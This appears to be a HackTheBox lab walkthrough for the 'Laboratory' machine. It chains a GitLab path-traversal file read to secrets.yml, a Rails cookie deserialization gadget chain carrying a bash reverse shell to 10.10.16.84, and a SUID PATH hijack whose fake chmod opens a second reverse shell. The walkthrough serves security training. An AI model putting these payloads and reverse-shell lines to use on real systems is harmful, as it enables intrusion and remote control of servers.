<h2 id="before-you-start">Before you start</h2>
<p>Use a repeatable process:</p>
<ol>
<li><strong>Reconnaissance</strong> : figure out what's running</li>
<li><strong>Enumeration</strong> : dig deeper into what you find</li>

<h2 id="phase-1-reconnaissance">Phase 1: Reconnaissance</h2>
<h3 id="step-1-update-etc-hosts">Step 1: Update /etc/hosts</h3>
<p>Before scanning, we set our attacker IP as a variable for convenience:</p>
<pre tabindex="0" aria-label="Code or terminal block 1"><code>Attacker IP: 10.10.16.84
Target IP:   10.129.12.122
</code></pre>
<p><strong>Why?</strong> On HTB machines, web servers often use virtual hosting - they serve different content depending on the <code>Host:</code> header in HTTP requests. If you just browse to the IP, you might miss entire sites. We need the hostnames to access those virtual hosts.</p>

<h3 id="step-2-nmap-port-scan-find-open-doors">Step 2: Nmap Port Scan: Find Open Doors</h3>
<pre tabindex="0" aria-label="bash code or terminal block 2"><code class="language-bash" data-language="bash">sudo nmap -p- --min-rate 10000 -oA lab-alltcp 10.129.12.122
</code></pre>
<p><strong>What this does:</strong></p>
<ul>
<li><code>-p-</code> : scan ALL 65535 ports, not just the common 1000</li>
<li><code>--min-rate 10000</code> : send at least 10,000 packets per second (fast)</li>
<li><code>-oA</code> : save output in all formats for later reference</li>
</ul>
<p><strong>Why scan all ports?</strong> Services can run on non-standard ports. A developer might put a management panel on port 8443 or a database on 3306. If you only scan the top 1000, you might miss it. On HTB machines especially, scanning all ports is mandatory.</p>
<p><strong>Result:</strong></p>
<pre tabindex="0" aria-label="Code or terminal block 3"><code>22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
</code></pre>
<p>Three services. SSH (remote access), HTTP (web), HTTPS (encrypted web). This tells us it's a web application server.</p>

<h3 id="step-3-detailed-service-scan-what-versions">Step 3: Detailed Service Scan: What Versions?</h3>

<p><strong>What this does:</strong></p>

<h2 id="phase-3-exploitation-getting-a-foothold">Phase 3: Exploitation (Getting a Foothold)</h2>
<h3 id="step-7-cve-2020-10977-arbitrary-file-read">Step 7: CVE-2020-10977: Arbitrary File Read</h3>
<p><strong>The vulnerability explained:</strong></p>
<p>When you create an issue in GitLab and attach an image using Markdown like:</p>
<pre tabindex="0" aria-label="Code or terminal block 7"><code>![img](/uploads/abc123/filename.png)
</code></pre>
<p>GitLab processes this upload path. The bug: if you move the issue to a different project, GitLab re-processes the upload path WITHOUT properly sanitizing directory traversal sequences (<code>../../../</code>). This lets you read ANY file the GitLab process has permission to read.</p>
<p><strong>How to exploit it manually:</strong></p>
<ol>
<li>Create two projects: <code>proj1</code> and <code>proj2</code></li>
<li>In <code>proj1</code>, create an issue with this description:<pre tabindex="0" aria-label="Code or terminal block 8"><code>![a](/uploads/REDACTED_HASH_OR_FLAG/../../../../../../../../../../../../../../etc/passwd)
</code></pre>
</li>
<li>Move the issue to <code>proj2</code> using the "Move issue" option in the right sidebar</li>
<li>In <code>proj2</code>, the issue now has a file attachment - click it to download <code>/etc/passwd</code></li>
</ol>
<p> The <code>REDACTED_HASH_OR_FLAG</code> is a fake upload hash (32 chars). GitLab's file server resolves the path starting from the uploads directory. The <code>../../../../../../</code> sequences navigate UP the directory tree all the way to the filesystem root, then descend into <code>etc/passwd</code>. This is a classic <strong>path traversal</strong> attack.</p>
<hr>
<h3 id="step-8-read-secrets-yml-the-master-key">Step 8: Read secrets.yml: The Master Key</h3>
<p>The real target isn't <code>/etc/passwd</code> - it's the Rails application's secret key. We read:</p>
<pre tabindex="0" aria-label="Code or terminal block 9"><code>/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml
</code></pre>
<p>This file contains:</p>
<pre tabindex="0" aria-label="yaml code or terminal block 10"><code class="language-yaml" data-language="yaml">production:
  secret_key_base: REDACTED_ENCODED_LAB_MATERIAL
</code></pre>
<p><strong>Why is this important?</strong> Rails uses <code>secret_key_base</code> to cryptographically sign cookies. It's the HMAC signing key. If you know this secret, you can:</p>
<ol>
<li>Forge any cookie value</li>
<li>Make Rails trust and deserialize it</li>
<li>Achieve <strong>Remote Code Execution</strong> through Ruby object deserialization</li>
</ol>
<p>This is the pivot from "read files" to "run code". The file read vulnerability becomes an RCE vulnerability because we know the secret.</p>
<hr>
<h3 id="step-9-understanding-the-deserialization-attack">Step 9: Understanding the Deserialization Attack</h3>
<p><strong>What is deserialization?</strong></p>
<p>Rails stores signed cookies as:</p>
<pre tabindex="0" aria-label="Code or terminal block 11"><code>base64(Marshal.dump(ruby_object))--HMAC_signature
</code></pre>
<p>When Rails receives a request with a signed cookie, it:</p>
<ol>
<li>Verifies the HMAC signature (to confirm the cookie wasn't tampered with)</li>
<li>Deserializes the Marshal binary data back into a Ruby object</li>
<li>Uses that object in the application</li>
</ol>
<p><strong>The attack:</strong> If we know the <code>secret_key_base</code>, we can sign our OWN malicious cookie. We craft a Ruby object that executes shell commands when deserialized. Rails trusts our signature, deserializes the object, and runs our code.</p>
<p><strong>The gadget chain:</strong></p>
<pre tabindex="0" aria-label="ruby code or terminal block 12"><code class="language-ruby" data-language="ruby"># ERB is Ruby's templating engine
# &lt;%= `command` %&gt; executes a shell command when result() is called
erb = ERB.new("&lt;%= `bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.84/4444 0&gt;&amp;1'` %&gt;")

# DeprecatedInstanceVariableProxy is an ActiveSupport class
# When ANY method is called on it, it calls target() which calls erb.result()
# This triggers the ERB evaluation (and our shell command)
depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(
  erb, :result, "@result", ActiveSupport::Deprecation.new
)

# Signing it with our stolen secret key
verifier = ActiveSupport::MessageVerifier.new(derived_key, serializer: Marshal)
cookie_value = verifier.generate(depr)
</code></pre>
<p>When the target GitLab receives this cookie, it deserializes the proxy object. The moment Rails accesses ANY property or calls ANY method on it (which happens automatically), the proxy calls <code>erb.result</code>, which evaluates the ERB template, which runs our bash reverse shell.</p>
<hr>
<h3 id="step-10-the-ruby-version-problem-and-how-we-solved-it">Step 10: The Ruby Version Problem and How We Solved It</h3>
<p><strong>The challenge:</strong> We can't just run this Ruby code anywhere.</p>
<ul>
<li>We tried <strong>Ruby 3.3</strong> (system Ruby) - FAILED. <code>ERB</code> objects have singleton classes in Ruby 3.x that prevent Marshal serialization. Error: <code>singleton class can't be dumped</code></li>
<li>We tried <strong>Docker with GitLab 12.8.1</strong> (amd64 image) - FAILED. Our Kali machine is ARM64 (Apple Silicon / ARM chip), and the GitLab Docker image is x86-64 only.</li>
<li>We tried <strong>Ruby 2.7</strong> (arm64 Docker image) - FAILED. Same singleton class issue.</li>
</ul>
<p><strong>The solution:</strong> GitLab 12.8.1 uses <strong>Ruby 2.6</strong> (you can see this from the path <code>/opt/gitlab/embedded/lib/ruby/gems/2.6.0/</code>). In Ruby 2.6, <code>ERB</code> objects CAN be Marshal'd. We use an ARM64 Ruby 2.6 Docker image:</p>
<pre tabindex="0" aria-label="bash code or terminal block 13"><code class="language-bash" data-language="bash">sudo docker pull arm64v8/ruby:2.6-alpine
sudo docker run --rm arm64v8/ruby:2.6-alpine sh -c "
  gem install zeitwerk -v 2.6.18 --no-document -q &amp;&amp;
  gem install activesupport -v 6.0.2 --no-document -q &amp;&amp;
  ruby -e '..cookie generation code..'
"
</code></pre>
<p> When something fails, ask "why?" and "what's different about the target environment?" The version mismatch between our attack machine and the target is the reason. match your exploit environment to the target's environment as closely as possible.</p>

<h3 id="step-11-generate-and-send-the-cookie">Step 11: Generate and Send the Cookie</h3>
<p>The Docker container outputs our malicious cookie:</p>
<pre tabindex="0" aria-label="Code or terminal block 14"><code>BAhvOkBBY3RpdmVTdXBwb3J0...--REDACTED_HASH_OR_FLAG
</code></pre>
<p>Start a netcat listener:</p>
<pre tabindex="0" aria-label="bash code or terminal block 15"><code class="language-bash" data-language="bash">nc -lvnp 4444
</code></pre>
<p>Send the cookie:</p>
<pre tabindex="0" aria-label="bash code or terminal block 16"><code class="language-bash" data-language="bash">curl -k -s "https://git.laboratory.htb/users/sign_in" \
  -b "experimentation_subject_id=BAhvOk..." \

<p><strong>Why <code>experimentation_subject_id</code>?</strong> GitLab uses this cookie for A/B testing features. The middleware that reads and deserializes this cookie runs on EVERY request, including unauthenticated ones. This is the attack vector - we don't need to be logged in.</p>

<h2 id="phase-5-accessing-the-host-machine">Phase 5: Accessing the Host Machine</h2>
<h3 id="step-15-the-openssl-3-x-compatibility-issue">Step 15: The OpenSSL 3.x Compatibility Issue</h3>
<pre tabindex="0" aria-label="bash code or terminal block 20"><code class="language-bash" data-language="bash">ssh -i dexter_.ssh_id_rsa dexter@laboratory.htb
# Load key "dexter_.ssh_id_rsa": error in libcrypto: unsupported
</code></pre>
<p><strong>Why does this fail?</strong> Our Kali Linux has OpenSSL 3.6.2 installed. OpenSSL 3.x has stricter security policies and removed support for certain legacy key operations. Dexter's SSH key was generated on the target machine (Ubuntu 20.04 with an older OpenSSL), and something about the key's format or parameters doesn't meet OpenSSL 3's requirements.</p>
<p><strong>The fix - use Python's Paramiko library:</strong></p>
<p>Paramiko is Python's SSH implementation. It uses the <code>cryptography</code> Python library (which has its own key handling) rather than calling the system's OpenSSL directly. This bypasses the compatibility issue entirely.</p>
<pre tabindex="0" aria-label="python code or terminal block 21"><code class="language-python" data-language="python">import paramiko
k = paramiko.RSAKey.from_private_key_file('/home/kali/Downloads/htb/dexter_.ssh_id_rsa')
c = paramiko.SSHClient()
c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
c.connect('laboratory.htb', username='dexter', pkey=k)
stdin, stdout, stderr = c.exec_command('id &amp;&amp; cat ~/user.txt')
print(stdout.read().decode())
</code></pre>
<p> When a tool fails, use a different tool. The goal is to achieve the action (SSH with a key), not to use a specific binary. Paramiko, puttygen, openssl, or even a different OS could all solve this problem. Think about the goal, not the method.</p>

<h2 id="phase-6-privilege-escalation-user-to-root">Phase 6: Privilege Escalation (User to Root)</h2>
<h3 id="step-16-enumerate-suid-binaries">Step 16: Enumerate SUID Binaries</h3>
<p>SUID (Set User ID) binaries run as their <strong>owner</strong> regardless of who executes them. A binary owned by root with SUID set will run as root even if a regular user executes it.</p>
<pre tabindex="0" aria-label="bash code or terminal block 22"><code class="language-bash" data-language="bash">find / -perm -4000 -user root -ls 2&gt;/dev/null
</code></pre>
<p>The interesting result:</p>
<pre tabindex="0" aria-label="Code or terminal block 23"><code>7838  20 -rwsr-xr-x  1 root  dexter  16720  Aug 28 2020  /usr/local/bin/docker-security
</code></pre>
<p>Note: this binary is owned by <code>root</code> (runs as root when executed) but is in the <code>dexter</code> group (dexter can execute it). It's only 16KB - this is a custom binary, not a standard system tool.</p>
<p> Standard system SUID binaries (sudo, passwd, etc.) are well-audited and hard to exploit. Custom SUID binaries written by the box creator are almost always intentionally vulnerable. A 16KB custom SUID binary called <code>docker-security</code> is a massive warning sign and should be the first thing you analyze.</p>
<hr>
<h3 id="step-17-analyze-the-suid-binary-with-ltrace">Step 17: Analyze the SUID Binary with ltrace</h3>
<p><code>ltrace</code> intercepts library calls made by a program. For this binary:</p>
<pre tabindex="0" aria-label="bash code or terminal block 24"><code class="language-bash" data-language="bash">ltrace docker-security
</code></pre>
<p>Output:</p>
<pre tabindex="0" aria-label="Code or terminal block 25"><code>setuid(0)
setgid(0)
system("chmod 700 /usr/bin/docker"...)
system("chmod 660 /var/run/docker.sock"...)
</code></pre>
<p><strong>The vulnerability revealed:</strong></p>
<p>The binary calls <code>system("chmod 700 /usr/bin/docker")</code> - it runs <code>chmod</code> <strong>without a full path</strong>. When a program calls <code>system("chmod")</code>, Linux searches for <code>chmod</code> in the directories listed in the <code>PATH</code> environment variable, <strong>in order</strong>.</p>
<p>If we control the PATH variable, we control which <code>chmod</code> binary gets executed.</p>
<hr>
<h3 id="step-18-path-hijack-the-attack">Step 18: PATH Hijack: The Attack</h3>
<p><strong>The concept:</strong></p>
<p>The binary does (pseudocode):</p>
<pre tabindex="0" aria-label="Code or terminal block 26"><code>setuid(0)     ← become root
setgid(0)     ← become root group
system("chmod 700 /usr/bin/docker")  ← runs "chmod" from PATH
</code></pre>
<p>If we create our own script called <code>chmod</code> in <code>/tmp</code> and put <code>/tmp</code> FIRST in the PATH, then when <code>docker-security</code> runs <code>chmod</code>, it runs OUR <code>chmod</code> instead of <code>/usr/bin/chmod</code>. And since <code>docker-security</code> has already called <code>setuid(0)</code>, our script runs as root.</p>
<p><strong>The exploit:</strong></p>
<pre tabindex="0" aria-label="python code or terminal block 27"><code class="language-python" data-language="python"># Via paramiko since we can't easily SSH interactively
cmds = """
printf '#!/bin/bash\nbash -i &gt;&amp; /dev/tcp/10.10.16.84/5555 0&gt;&amp;1\n' &gt; /tmp/chmod
chmod +x /tmp/chmod
export PATH=/tmp:$PATH
/usr/local/bin/docker-security
"""
</code></pre>
<p><strong>Breaking this down:</strong></p>
<ol>
<li><code>printf '#!/bin/bash\nbash...' &gt; /tmp/chmod</code> : create a script named <code>chmod</code> that opens a reverse shell. The <code>#!/bin/bash</code> shebang is REQUIRED - without it, the system uses <code>/bin/sh</code> which doesn't support <code>&gt;&amp;</code> redirect syntax.</li>
<li><code>chmod +x /tmp/chmod</code> : make our fake chmod executable (using the REAL chmod, since PATH hasn't been changed yet)</li>
<li><code>export PATH=/tmp:$PATH</code> : prepend <code>/tmp</code> to PATH so our fake chmod is found first</li>
<li><code>/usr/local/bin/docker-security</code> : trigger the exploit</li>
</ol>
<p><strong>Result:</strong></p>
<pre tabindex="0" aria-label="Code or terminal block 28"><code>root@laboratory:~# id
uid=0(root) gid=0(root) groups=0(root),1000(dexter)
</code></pre>
<p><strong>Root flag:</strong> <code>17d585[redacted]11843934f7</code></p>

<h2 id="key-lessons-and-takeaways">Key Lessons and Takeaways</h2>
<h3 id="1-certificates-leak-information">1. Certificates leak information</h3>
<p>TLS certs often contain internal hostnames in SAN fields. Check them with nmap or <code>openssl s_client</code>.</p>
<h3 id="2-version-numbers-are-everything">2. Version numbers are everything</h3>
<p>Knowing the exact software version turns "there's a web app here" into "there's a specific CVE here". fingerprint software versions.</p>
<h3 id="3-file-reads-can-escalate-to-rce">3. File reads can escalate to RCE</h3>
<p>An arbitrary file read vulnerability sounds less scary than RCE, but if you can read the right file (like Rails <code>secrets.yml</code> or SSH private keys), it becomes effectively equivalent to RCE.</p>
<h3 id="4-match-your-environment-to-the-target">4. Match your environment to the target</h3>
<p>The deserialization exploit failed in Ruby 2.7 but worked in Ruby 2.6 because that's what the TARGET runs. research what runtime version the target uses and replicate it.</p>
<h3 id="5-docker-containers-are-not-the-end">5. Docker containers are not the end</h3>
<p>Getting a shell inside a container isn't the end of the exploit chain. Use the container's privileged access to its application (GitLab in this case) to pivot to the host.</p>
<h3 id="6-suid-binaries-with-relative-paths-path-hijack">6. SUID binaries with relative paths = PATH hijack</h3>
<p>Any SUID binary that calls <code>system("program")</code> without a full path like <code>system("/usr/bin/program")</code> is vulnerable to PATH hijacking. <code>ltrace</code> and <code>strace</code> are your best friends for finding these.</p>
